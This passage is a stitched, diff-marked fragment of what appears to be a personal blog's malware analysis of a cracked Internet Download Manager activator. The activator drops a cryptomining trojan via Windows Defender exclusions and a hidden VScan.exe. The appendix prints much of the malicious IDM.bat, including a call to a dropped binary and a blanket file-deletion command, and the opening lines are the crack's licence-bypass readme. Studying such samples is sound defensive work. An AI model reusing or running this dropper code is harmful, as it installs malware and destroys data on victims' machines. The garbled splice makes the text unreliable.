- - IDM updates can be installed directly without having to activate again.
-
- - After the activation, if in some case, the IDM starts to show activation nag screen, 
-   then just run the activation option again.
-
-_________________________________
-
-   Reset IDM Activation / Trial:
-_________________________________
-
- - Internet download manager provides 30 days trial period, you can use this script to 
-   reset this Activation / Trial period whenever you want.
-
- - This option also can be used to restore status if in case the IDM reports fake serial
-   key and other similar errors.
-
-_________________________________
-
-   OS requirement:
-_________________________________
-
- - Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
-
-_________________________________
-
- - Troubleshooting steps:
-_________________________________
-
- - If any other activator was used to activate IDM previously then make sure to properly
-   uninstall it with that same activator (if there is an option), this is especially important
-   if any registry / firewall block method was used.
-
- - Uninstall the IDM from control panel.
-
- - Make sure the latest original IDM setup is used for the installation,
-   you can download it from https://www.internetdownloadmanager.com/download.html
-
- - Now install the IDM and use the activate option.
-
-____________________________________________________________________________________________________
-:txt:
-
-::========================================================================================================================================
-</code></pre></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-11-13</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/cybersecurity/>cybersecurity</a>,&nbsp;<a href=/tags/reverse/>Reverse</a>,&nbsp;<a href=/tags/malware/>malware</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/writeup-for-orgctf2-crypto/ class=prev rel=prev title="Writeup for ORGCTF2: Crypto.my_own_cryptography"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Writeup for ORGCTF2: Crypto.my_own_cryptography</a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=www.debidong.github.io target=_blank>debidong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</span></span></code></pre></div><p>Yes, it turns out that the &ldquo;Hide protected operating system files&rdquo; feature is implemented through the registry.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113153600226.png data-srcset="./assets/image-20231113153600226.png, ./assets/image-20231113153600226.png 1.5x, ./assets/image-20231113153600226.png 2x" data-sizes=auto alt=./assets/image-20231113153600226.png title=image-20231113153600226></p><p>It&rsquo;s not hard to notice that the script releases another genuine malicious sample, <code>VScan.exe</code>, from <code>file.tmp</code> at the end. I believe it&rsquo;s the latter that further achieves the intrusion of the mining trojan through DLL injection.</p><h4 id=155-vscanexe>1.5.5 VScan.exe</h4><p>To obtain VScan, we&rsquo;ll need to manually extract it from <code>files.tmp</code> using the same decompression password.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152613457.png data-srcset="./assets/image-20231113152613457.png, ./assets/image-20231113152613457.png 1.5x, ./assets/image-20231113152613457.png 2x" data-sizes=auto alt=./assets/image-20231113152613457.png title=image-20231113152613457></p><p>This is a highly dangerous program. Let&rsquo;s not forget that the <code>IDM0.bat</code> script has set exclusions for Windows Defender, so at this point, Windows Defender can no longer detect VScan.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152916887.png data-srcset="./assets/image-20231113152916887.png, ./assets/image-20231113152916887.png 1.5x, ./assets/image-20231113152916887.png 2x" data-sizes=auto alt=./assets/image-20231113152916887.png title=image-20231113152916887></p><p>Through the <code>IDM.bat</code> script, it&rsquo;s discovered that the latter two payloads are called by the registration script, further achieving the registration process. Due to time constraints, the analysis of these two programs is not yet complete. Here are their imported functions.</p><h4 id=156-nsudo86exe>1.5.6 NSudo86.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102409162.png data-srcset="./assets/image-20231113102409162.png, ./assets/image-20231113102409162.png 1.5x, ./assets/image-20231113102409162.png 2x" data-sizes=auto alt=./assets/image-20231113102409162.png title=image-20231113102409162></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102608468.png data-srcset="./assets/image-20231113102608468.png, ./assets/image-20231113102608468.png 1.5x, ./assets/image-20231113102608468.png 2x" data-sizes=auto alt=./assets/image-20231113102608468.png title=image-20231113102608468></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102531606.png data-srcset="./assets/image-20231113102531606.png, ./assets/image-20231113102531606.png 1.5x, ./assets/image-20231113102531606.png 2x" data-sizes=auto alt=./assets/image-20231113102531606.png title=image-20231113102531606></p><h4 id=157-ab2efexe>1.5.7 AB2EF.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113104401045.png data-srcset="./assets/image-20231113104401045.png, ./assets/image-20231113104401045.png 1.5x, ./assets/image-20231113104401045.png 2x" data-sizes=auto alt=./assets/image-20231113104401045.png title=image-20231113104401045></p><h2 id=2-conclusion>2 Conclusion</h2><p>Through the static analysis, dynamic debugging, and sample evidence collection as described above, we have gained a basic understanding of the process by which the malicious sample releases the mining trojan. I believe what was mentioned in the registration tool&rsquo;s <code>Readme.txt</code>: temporarily disabling Windows Defender is necessary for activating the software, enabling the success of the malicious sample. I admit I was a bit naïve. Additionally, the design of this sample is quite clever, and overall, the analysis process is quite interesting. I&rsquo;m fortunate that it&rsquo;s just a mining trojan, and I noticed the error messages from the command prompt. Remember <code>WinRing0x64.sys</code>? It&rsquo;s a file from Microsoft used to obtain hardware information about the computer. It&rsquo;s possible that this mining trojan would operate gently within the hardware capabilities of my computer, remaining undetected for an extended period. Well, it seems that I&rsquo;ll need to be more cautious when searching for resources online in the future.</p><h2 id=3-link>3 Link</h2><p>Later on, I discovered posts from other people online who had experienced similar issues. Haha, it turns out I&rsquo;m not alone in this! There&rsquo;s even a report from the U.S. government!</p><ul><li><p><a href=https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf target=_blank rel="noopener noreffer">https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf</a></p></li><li><p><a href=https://www.52pojie.cn/thread-1774226-1-1.html target=_blank rel="noopener noreffer">https://www.52pojie.cn/thread-1774226-1-1.html</a></p></li></ul><h2 id=4-appendix>4 Appendix</h2><ul><li><p>Hash of the malicious sample: <code>61208ef95b922b0e93f0dbea9d4d565d</code></p></li><li><p>Source of the malicious sample: <code>https://www.crackingcity.com/idm-crack/</code></p></li><li><p>IDM.bat</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=p>@</span><span class=k>setlocal</span> DisableDelayedExpansion
+</span></span><span class=line><span class=cl><span class=p>@</span><span class=k>echo</span> off
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Add custom name in IDM license info, prefer to write it in English and/or numeric in below line after = sign,</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>name</span><span class=p>=</span><span class=nv>%Username%</span> - by crackingcity.com
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>title</span><span class=p>=</span>Internet Download Manager (IDM) 6.xx Activator or Resetter v3.1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Re-launch the script with x64 process if it was initiated by x86 process on x64 bit Windows</span>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: or with ARM64 process if it was initiated by x86/ARM32 process on ARM64 Windows</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=nv>%SystemRoot%</span>\Sysnative\cmd.exe <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_cmdf=</span><span class=nv>%~f0</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>setlocal</span> EnableDelayedExpansion
+</span></span><span class=line><span class=cl><span class=k>start</span> <span class=nv>%SystemRoot%</span>\Sysnative\cmd.exe /c <span class=s2>&#34;&#34;</span><span class=nv>!_cmdf!</span><span class=s2>&#34; </span><span class=nv>%*</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Re-launch the script with ARM32 process if it was initiated by x64 process on ARM64 Windows</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>exist</span> <span class=nv>%SystemRoot%</span>\Windows\SyChpe32\kernel32.dll <span class=k>if</span> <span class=k>exist</span> <span class=nv>%SystemRoot%</span>\SysArm32\cmd.exe <span class=k>if</span> <span class=nv>%PROCESSOR_ARCHITECTURE%</span><span class=o>==</span>AMD64 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_cmdf=</span><span class=nv>%~f0</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>setlocal</span> EnableDelayedExpansion
+</span></span><span class=line><span class=cl><span class=k>start</span> <span class=nv>%SystemRoot%</span>\SysArm32\cmd.exe /c <span class=s2>&#34;&#34;</span><span class=nv>!_cmdf!</span><span class=s2>&#34; </span><span class=nv>%*</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  Set Path variable, it helps if it is misconfigured in the system</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;SysPath=</span><span class=nv>%SystemRoot%</span><span class=s2>\System32&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;Path=</span><span class=nv>%SysPath%</span><span class=s2>;</span><span class=nv>%SystemRoot%</span><span class=s2>;</span><span class=nv>%SysPath%</span><span class=s2>\Wbem;</span><span class=nv>%SysPath%</span><span class=s2>\WindowsPowerShell\v1.0\&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>cls</span>
+</span></span><span class=line><span class=cl><span class=k>color</span> 07
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_args</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_elev</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>reset</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>Silent</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>activate</span><span class=p>=</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_args</span><span class=p>=</span><span class=nv>%*</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>_args</span> <span class=k>set</span> <span class=nv>_args</span><span class=p>=</span><span class=nv>%_args:&#34;=%</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>_args</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=se>%%</span>A <span class=k>in</span> <span class=p>(</span><span class=nv>%_args%</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>/i</span> <span class=s2>&#34;</span><span class=se>%%</span><span class=s2>A&#34;</span><span class=o>==</span><span class=s2>&#34;-el&#34;</span>  <span class=k>set</span> <span class=nv>_elev</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>/i</span> <span class=s2>&#34;</span><span class=se>%%</span><span class=s2>A&#34;</span><span class=o>==</span><span class=s2>&#34;/res&#34;</span> <span class=k>set</span> <span class=nv>Unattended</span><span class=p>=</span>1<span class=p>&amp;</span><span class=k>set</span> <span class=nv>activate</span><span class=p>=&amp;</span><span class=k>set</span> <span class=nv>reset</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>/i</span> <span class=s2>&#34;</span><span class=se>%%</span><span class=s2>A&#34;</span><span class=o>==</span><span class=s2>&#34;/act&#34;</span> <span class=k>set</span> <span class=nv>Unattended</span><span class=p>=</span>1<span class=p>&amp;</span><span class=k>set</span> <span class=nv>activate</span><span class=p>=</span>1<span class=p>&amp;</span><span class=k>set</span> <span class=nv>reset</span><span class=p>=</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>/i</span> <span class=s2>&#34;</span><span class=se>%%</span><span class=s2>A&#34;</span><span class=o>==</span><span class=s2>&#34;/s&#34;</span>   <span class=k>set</span> <span class=nv>Unattended</span><span class=p>=</span>1<span class=p>&amp;</span><span class=k>set</span> <span class=nv>Silent</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;nul=&gt;nul 2&gt;&amp;1&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_psc=</span><span class=nv>%SystemRoot%</span><span class=s2>\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>winbuild</span><span class=p>=</span>1
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;tokens=6 delims=[]. &#34;</span> <span class=se>%%</span>G <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;ver&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>set</span> <span class=nv>winbuild</span><span class=p>=</span><span class=se>%%</span>G
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_colorprep</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;nceline=echo: &amp;echo ==== ERROR ==== &amp;echo:&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;line=_________________________________________________________________________________________&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_buf={$W=$Host.UI.RawUI.WindowSize;$B=$Host.UI.RawUI.BufferSize;$W.Height=31;$B.Height=300;$Host.UI.RawUI.WindowSize=$W;$Host.UI.RawUI.BufferSize=$B;}&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>Silent</span> <span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>activate</span> <span class=k>if</span> <span class=k>not</span> <span class=k>defined</span> <span class=nv>reset</span> <span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>Silent</span> <span class=k>call</span> <span class=p>:</span><span class=nl>begin</span> <span class=nv>%nul%</span> <span class=p>&amp;</span> <span class=k>exit</span> /b
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>begin</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>%_psc%</span><span class=s2>&#34;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%nceline%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Powershell is not installed in the system.
+</span></span><span class=line><span class=cl><span class=k>echo</span> Aborting...
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done2</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%winbuild%</span> <span class=ow>LSS</span> 7600 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=nv>%nceline%</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span> Unsupported OS version Detected.
+</span></span><span class=line><span class=cl><span class=k>echo</span> Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
+</span></span><span class=line><span class=cl><span class=k>goto</span> <span class=nl>done2</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:  Fix for the special characters limitation in path name</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_work=</span><span class=nv>%~dp0</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;</span><span class=nv>%_work:~-1%</span><span class=s2>&#34;</span><span class=o>==</span><span class=s2>&#34;\&#34;</span> <span class=k>set</span> <span class=s2>&#34;_work=</span><span class=nv>%_work:~0,-1%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_batf=</span><span class=nv>%~f0</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_batp=</span><span class=nv>%_batf:&#39;=&#39;&#39;%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_PSarg</span><span class=p>=</span><span class=s2>&#34;&#34;&#34;</span><span class=nv>%~f0</span><span class=s2>&#34;&#34;&#34;</span> -el <span class=nv>%_args%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_appdata=</span><span class=nv>%appdata%</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;tokens=2*&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query &#34;HKCU\Software\DownloadManager&#34; /v ExePath 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=k>call</span> <span class=k>set</span> <span class=s2>&#34;IDMan=</span><span class=se>%%</span><span class=s2>b&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>setlocal</span> EnableDelayedExpansion
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Below code also works for ARM64 Windows 10 (including x64 bit emulation)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>reg query <span class=s2>&#34;HKLM\Hardware\Description\System\CentralProcessor\0&#34;</span> /v <span class=s2>&#34;Identifier&#34;</span> <span class=p>|</span> find /i <span class=s2>&#34;x86&#34;</span> <span class=mi>1</span><span class=p>&gt;</span>nul <span class=p>&amp;&amp;</span> <span class=k>set</span> <span class=nv>arch</span><span class=p>=</span>x86<span class=p>||</span> <span class=k>set</span> <span class=nv>arch</span><span class=p>=</span>x64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=k>exist</span> <span class=s2>&#34;</span><span class=nv>!IDMan!</span><span class=s2>&#34;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%arch%</span><span class=o>==</span>x64 <span class=k>set</span> <span class=s2>&#34;IDMan=</span><span class=nv>%ProgramFiles(x86)%</span><span class=s2>\Internet Download Manager\IDMan.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%arch%</span><span class=o>==</span>x86 <span class=k>set</span> <span class=s2>&#34;IDMan=</span><span class=nv>%ProgramFiles%</span><span class=s2>\Internet Download Manager\IDMan.exe&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=s2>&#34;</span><span class=nv>%arch%</span><span class=s2>&#34;</span><span class=o>==</span><span class=s2>&#34;x86&#34;</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;CLSID=HKCU\Software\Classes\CLSID&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;HKLM=HKLM\Software\Internet Download Manager&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_tok=5&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span> <span class=k>else</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;CLSID=HKCU\Software\Classes\Wow6432Node\CLSID&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;HKLM=HKLM\SOFTWARE\Wow6432Node\Internet Download Manager&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;_tok=6&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_temp</span><span class=p>=</span><span class=nv>%SystemRoot%</span>\Temp
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>regdata</span><span class=p>=</span><span class=nv>%SystemRoot%</span>\Temp\regdata.txt
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=s2>&#34;idmcheck=tasklist /fi &#34;</span>imagename eq idman.exe<span class=s2>&#34; | findstr /i &#34;</span>idman.exe<span class=s2>&#34; &gt;nul&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>:========================================================================================================================================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>Unattended</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>reset</span> <span class=k>goto</span> <span class=nl>_reset</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>defined</span> <span class=nv>activate</span> <span class=k>goto</span> <span class=nl>_activate</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>MainMenu</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>cls</span>
+</span></span><span class=line><span class=cl><span class=k>TITLE</span> <span class=nv>%title%</span>
+</span></span><span class=line><span class=cl>mode 89, 23
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Check firewall status</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>_ena</span><span class=o>=</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=k>/a</span> <span class=nv>_dis</span><span class=o>=</span><span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=se>%%</span># <span class=k>in</span> <span class=p>(</span>DomainProfile PublicProfile StandardProfile<span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/f</span> <span class=s2>&#34;skip=2 tokens=2*&#34;</span> <span class=se>%%</span>a <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\</span><span class=se>%%</span><span class=s1># /v EnableFirewall 2^&gt;nul&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>/i</span> <span class=se>%%</span>b <span class=ow>equ</span> 0x1 <span class=p>(</span><span class=k>set</span> <span class=k>/a</span> <span class=nv>_ena</span><span class=o>+=</span><span class=mi>1</span><span class=p>)</span> <span class=k>else</span> <span class=p>(</span><span class=k>set</span> <span class=k>/a</span> <span class=nv>_dis</span><span class=o>+=</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_ena%</span><span class=o>==</span>3 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_status</span><span class=p>=</span>Enabled
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_col</span><span class=p>=</span><span class=nv>%_Green%</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_dis%</span><span class=o>==</span>3 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_status</span><span class=p>=</span>Disabled
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_col</span><span class=p>=</span><span class=nv>%_Red%</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>not</span> <span class=nv>%_ena%</span><span class=o>==</span>3 <span class=k>if</span> <span class=k>not</span> <span class=nv>%_dis%</span><span class=o>==</span>3 <span class=p>(</span>
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_status</span><span class=p>=</span>Status_Unclear
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_col</span><span class=p>=</span><span class=nv>%_Yellow%</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>AB2EF kF5nJ4D92hfOpc8 <span class=nv>%nul%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span>:
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                  _____________________________________________________
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                                                          
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     [1] Activate IDM
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     [2] Reset IDM Activation / Trial in Registry
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     _______________________________________________
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                                                          
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color2</span> <span class=nv>%_White%</span> <span class=s2>&#34;                     [3] Toggle Windows Firewall  &#34;</span> <span class=nv>%_col%</span> <span class=s2>&#34;[</span><span class=nv>%_status%</span><span class=s2>]&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     _______________________________________________
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                                                          
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     [4] ReadMe
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     [5] Homepage
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                     [6] Exit
+</span></span><span class=line><span class=cl><span class=k>echo</span>:                  _____________________________________________________
+</span></span><span class=line><span class=cl><span class=k>echo</span>:   
+</span></span><span class=line><span class=cl><span class=k>call</span> <span class=p>:</span><span class=nl>_color2</span> <span class=nv>%_White%</span> <span class=s2>&#34;                    &#34;</span> <span class=nv>%_Green%</span> <span class=s2>&#34;Enter a menu option in the Keyboard [1,2,3,4,5,6]&#34;</span>
+</span></span><span class=line><span class=cl>choice /C:123456 /N
+</span></span><span class=line><span class=cl><span class=k>set</span> <span class=nv>_erl</span><span class=p>=</span><span class=nv>%errorlevel%</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>6 <span class=k>DEL</span> /F /Q /A *.* <span class=nv>%nul%</span><span class=p>&amp;</span><span class=k>exit</span> /b
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nv>%_erl%</span><span class=o>==</span>5 <span class=k>goto</span> <span class=nl>homepage</span>
